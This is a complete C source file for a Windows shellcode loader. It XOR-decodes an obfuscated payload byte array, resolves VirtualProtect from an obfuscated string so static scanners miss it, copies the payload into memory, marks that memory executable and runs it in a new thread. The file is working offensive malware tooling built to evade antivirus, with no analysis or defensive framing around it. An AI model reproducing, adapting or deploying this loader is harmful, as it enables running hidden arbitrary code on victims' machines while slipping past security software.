#include "windows.h"
#include "stdio.h"
#include "stdlib.h"

BOOL (WINAPI * pVirtualProtect)( LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);

void _xor(char* data, size_t data_len, char* key, size_t key_len){
	
	int j = 0;
	for(int i = 0; i < data_len; i++){
		if(j == key_len-1) j=0;
		data[i] = data[i] ^ key[j++];
	}
	return;
}

int main(void){

	void * exec_mem;
	HANDLE th;
	DWORD oldprotect = 0;
	unsigned char sVirtualProtect[] = { 0x37, 0xd, 0x45, 0x4c, 0x45, 0x4b, 0x32, 0x75, 0x40, 0x5e, 0x15, 0x1, 0x54, 0x4c};
	unsigned char payload[] = { 0x9d, 0x2c, 0xb4, 0xdc, 0xc0, 0xc2, 0x9e, 0x25, 0x32, 0x31, 0x20, 0x35, 0x76, 0x68, 0x62, 0x7b, 0x8, 0x6d, 0x3, 0xe3, 0x4, 0x2c, 0xbc, 0x6a, 0x50, 0x62, 0xd5, 0x77, 0x2a, 0x79, 0xea, 0x36, 0x17, 0x70, 0xbb, 0x58, 0xe, 0x6d, 0x3d, 0x86, 0x2b, 0x2e, 0x7a, 0x9, 0xf9, 0x62, 0x6f, 0xe5, 0x9e, 0xd, 0x0, 0x18, 0x35, 0x14, 0x10, 0x6b, 0x9f, 0xec, 0x3f, 0x70, 0x60, 0xa5, 0xd5, 0xd5, 0x62, 0x6b, 0xf, 0x6d, 0xb9, 0x63, 0x41, 0xef, 0x75, 0x4, 0x78, 0x2b, 0x8e, 0xae, 0xb2, 0xb9, 0x61, 0x64, 0x37, 0x70, 0xb5, 0xea, 0x2a, 0x42, 0x7a, 0x30, 0xb1, 0x34, 0xbc, 0x70, 0x28, 0x6e, 0xd5, 0x65, 0x12, 0x78, 0x60, 0xb4, 0xd4, 0x6e, 0x78, 0xd5, 0x97, 0x64, 0xb9, 0x5, 0xe9, 0x2c, 0x36, 0xee, 0x7d, 0x1b, 0x97, 0x6d, 0x3, 0xf1, 0xcd, 0x25, 0xf6, 0xf1, 0x3d, 0x6b, 0x5f, 0xe4, 0xa, 0xd1, 0x14, 0x95, 0x7b, 0x3b, 0x7c, 0xe, 0x56, 0x60, 0xb, 0xe0, 0x14, 0xbc, 0x6f, 0x7c, 0xbb, 0x6a, 0x7a, 0x6c, 0x33, 0xe1, 0x7, 0x25, 0xbc, 0x34, 0x78, 0x6e, 0xd5, 0x65, 0x2e, 0x78, 0x60, 0xb4, 0x76, 0xb3, 0x34, 0xa2, 0x16, 0x24, 0xe2, 0x70, 0x39, 0x25, 0x6f, 0x66, 0x69, 0x70, 0x1f, 0x7d, 0x73, 0x68, 0x20, 0x3e, 0x7f, 0xbb, 0xdc, 0xa, 0x1f, 0x77, 0xcd, 0xd1, 0x39, 0x25, 0x6e, 0x62, 0x78, 0xa1, 0x4c, 0xcc, 0x65, 0xce, 0x9e, 0x9b, 0x6a, 0x70, 0x8a, 0x2b, 0x5e, 0x25, 0x32, 0x31, 0x61, 0x64, 0x37, 0x70, 0xbd, 0xa7, 0x5f, 0x24, 0x32, 0x31, 0x20, 0xde, 0x6, 0xb3, 0x5f, 0xad, 0xa1, 0xf0, 0x89, 0xc1, 0xd4, 0xc6, 0x61, 0x79, 0x8a, 0x8c, 0xcb, 0x98, 0xaf, 0xce, 0xb4, 0x2c, 0xb4, 0xfc, 0x18, 0x16, 0x58, 0x59, 0x38, 0xb1, 0x9a, 0x84, 0x42, 0x3d, 0x8b, 0x6d, 0x4d, 0x57, 0x5d, 0x5b, 0x61, 0x3d, 0x76, 0xb1, 0xea, 0xd5, 0x8b, 0x46, 0x53, 0x5d, 0x2, 0x4a, 0x52, 0x40, 0x55, 0x2a};
	unsigned int  payload_len = sizeof(payload);
	unsigned char key[] = "ad780*^%21";

	_xor((char *)sVirtualProtect, sizeof(sVirtualProtect), key, sizeof(key));
	pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"),sVirtualProtect);
	exec_mem = VirtualAlloc(0,payload_len,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
	_xor((char *)payload, payload_len, key, sizeof(key));
	RtlMoveMemory(exec_mem, payload, payload_len);
	if(pVirtualProtect(exec_mem,payload_len,PAGE_EXECUTE_READ,&oldprotect) != 0){
		th = CreateThread(0,0,(LPTHREAD_START_ROUTINE)exec_mem,0,0,0);
		WaitForSingleObject(th,-1);
	}

	return 0;
}